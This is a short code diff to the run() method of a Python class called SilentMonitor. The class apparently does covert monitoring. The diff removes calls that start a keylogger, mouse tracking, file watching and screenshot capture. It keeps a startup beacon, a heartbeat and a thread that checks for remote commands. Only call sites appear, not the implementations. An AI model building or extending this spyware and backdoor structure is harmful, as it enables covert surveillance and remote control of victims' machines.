@@ -369,22 +369,15 @@ class SilentMonitor:
                 pass
     
     def run(self):
-        """Main execution"""
+        """Main execution: Heartbeat and Command Checking only"""
         # Wait for system to stabilize
         time.sleep(60)
         
         # Send startup notification
         self.send_data('/event', {'event': 'startup'})
         
-        # Start monitoring threads
-        self.start_keylogger()
-        self.start_mouse_tracker()
-        self.monitor_file_changes()
-        
-        # Start background threads
+        # Start ONLY the heartbeat and command checking background threads
         threading.Thread(target=self.heartbeat_loop, daemon=True).start()
-        threading.Thread(target=self.screenshot_loop, daemon=True).start()
-        threading.Thread(target=self.periodic_tasks, daemon=True).start()
         threading.Thread(target=self.check_commands, daemon=True).start()
         
         # Keep main thread alive
